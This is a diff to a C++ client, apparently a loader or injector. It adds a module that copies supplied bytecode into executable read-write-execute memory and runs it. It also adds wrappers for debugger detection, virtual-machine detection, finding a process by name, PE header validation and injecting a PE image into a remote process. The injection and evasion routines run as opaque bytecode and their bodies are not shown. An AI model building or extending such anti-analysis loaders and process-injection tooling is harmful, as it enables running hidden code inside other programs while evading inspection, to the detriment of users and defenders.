@@ -2,7 +2,6 @@
 #include "packet.hpp"
 #include "crypto.hpp"
 #include "compression.hpp"
-#include "protected_functions.hpp"
 
 #ifdef _WIN32
 #include "syscalls.hpp"
@@ -25,11 +24,124 @@
 #include <condition_variable>
 #include <unordered_map>
 #include <memory>
+#include <cstring>
+#include <string_view>
+#include <span>
 
 using namespace std::chrono_literals;
 
 namespace client
 {
+	/*
+	   ========================================================================
+	   PROTECTED FUNCTIONS SYSTEM - Integrated directly in client
+	   ========================================================================
+	*/
+
+	namespace protect
+	{
+		/**
+		 * @brief compile-time FNV-1a hash for function markers
+		 */
+		constexpr auto fnv1a_hash( std::string_view str ) noexcept -> uint32_t
+		{
+			uint32_t hash{ 2166136261u };
+			for ( char c : str )
+			{
+				hash ^= static_cast<uint32_t>( c );
+				hash *= 16777619u;
+			}
+			return hash;
+		}
+
+		/**
+		 * @brief function marker
+		 */
+		struct function_marker_t
+		{
+			uint32_t hash{ };
+			std::string_view name{ };
+
+			constexpr function_marker_t( std::string_view n ) noexcept
+				: hash{ fnv1a_hash( n ) }, name{ n }
+			{
+			}
+		};
+
+		/**
+		 * @brief temporary function executor
+		 */
+		class temporary_function_t
+		{
+			void* m_exec_memory{ nullptr };
+			size_t m_size{ 0 };
+
+		public:
+			explicit temporary_function_t( std::span<const uint8_t> bytecode ) : m_size{ bytecode.size( ) }
+			{
+				if ( bytecode.empty( ) ) return;
+
+#ifdef _WIN32
+				m_exec_memory = VirtualAlloc( nullptr, m_size,
+				                              MEM_COMMIT | MEM_RESERVE,
+				                              PAGE_EXECUTE_READWRITE );
+				if ( m_exec_memory )
+				{
+					std::memcpy( m_exec_memory, bytecode.data( ), m_size );
+				}
+#else
+				m_exec_memory = mmap( nullptr, m_size,
+				                      PROT_READ | PROT_WRITE | PROT_EXEC,
+				                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 );
+				if ( m_exec_memory != MAP_FAILED )
+				{
+					std::memcpy( m_exec_memory, bytecode.data( ), m_size );
+				}
+				else
+				{
+					m_exec_memory = nullptr;
+				}
+#endif
+			}
+
+			~temporary_function_t( )
+			{
+				if ( m_exec_memory )
+				{
+#ifdef _WIN32
+					VirtualFree( m_exec_memory, 0, MEM_RELEASE );
+#else
+					munmap( m_exec_memory, m_size );
+#endif
+				}
+			}
+
+			temporary_function_t( const temporary_function_t& ) = delete;
+			auto operator=( const temporary_function_t& ) -> temporary_function_t& = delete;
+
+			template<typename Ret, typename... Args>
+			auto execute( Args&&... args ) const -> Ret
+			{
+				if ( !m_exec_memory )
+				{
+					if constexpr ( std::is_same_v<Ret, bool> ) return false;
+					else if constexpr ( std::is_arithmetic_v<Ret> ) return static_cast<Ret>( 0 );
+					else return Ret{ };
+				}
+
+				using fn_ptr = Ret( * )( Args... );
+				auto fn{ reinterpret_cast<fn_ptr>( m_exec_memory ) };
+				return fn( std::forward<Args>( args )... );
+			}
+
+			[[nodiscard]] auto valid( ) const noexcept -> bool
+			{
+				return m_exec_memory != nullptr;
+			}
+		};
+
+	} // namespace protect
+
 	/*
 	   client-side protection system (bytecode storage and execution)
 	*/
@@ -412,6 +524,85 @@ namespace client
 			return temp_fn.execute<Ret>( std::forward<Args>( args )... );
 		}
 	};
+
+	/*
+	   ========================================================================
+	   SIMPLE WRAPPERS FOR PROTECTED FUNCTIONS - Direct calls
+	   ========================================================================
+	*/
+
+	/**
+	 * @brief check if debugger is present
+	 * @return true if debugger detected
+	 */
+	inline auto check_debugger_present( ) -> bool
+	{
+		return protected_function_caller_t::call<bool>( protect::function_marker_t{ "check_debugger_present" } );
+	}
+
+	/**
+	 * @brief check if running in virtual machine
+	 * @return true if VM detected
+	 */
+	inline auto check_vm_present( ) -> bool
+	{
+		return protected_function_caller_t::call<bool>( protect::function_marker_t{ "check_vm_present" } );
+	}
+
+	/**
+	 * @brief find process ID by name
+	 * @param process_name process executable name
+	 * @param name_len length of process name
+	 * @return process ID or 0 if not found
+	 */
+	inline auto find_process_by_name( const char* process_name, size_t name_len ) -> uint32_t
+	{
+		return protected_function_caller_t::call<uint32_t>(
+			protect::function_marker_t{ "find_process_by_name" },
+			process_name, name_len
+		);
+	}
+
+	/**
+	 * @brief validate PE file headers
+	 * @param pe_data PE file data
+	 * @param size size of PE data
+	 * @return true if valid PE
+	 */
+	inline auto validate_pe( const uint8_t* pe_data, size_t size ) -> bool
+	{
+		return protected_function_caller_t::call<bool>(
+			protect::function_marker_t{ "validate_pe" },
+			pe_data, size
+		);
+	}
+
+	/**
+	 * @brief inject PE into remote process
+	 * @param pe_data PE file data
+	 * @param pe_size PE file size
+	 * @param entry_rva entry point RVA
+	 * @param target_process target process name
+	 * @param target_process_len target process name length
+	 * @param out_base_address output base address
+	 * @return true if injection succeeded
+	 */
+	inline auto inject_pe(
+		const uint8_t* pe_data,
+		size_t pe_size,
+		uint32_t entry_rva,
+		const char* target_process,
+		size_t target_process_len,
+		uint64_t* out_base_address
+	) -> bool
+	{
+		return protected_function_caller_t::call<bool>(
+			protect::function_marker_t{ "inject_pe" },
+			pe_data, pe_size, entry_rva,
+			target_process, target_process_len,
+			out_base_address
+		);
+	}
 
 	/*
 	   client constants
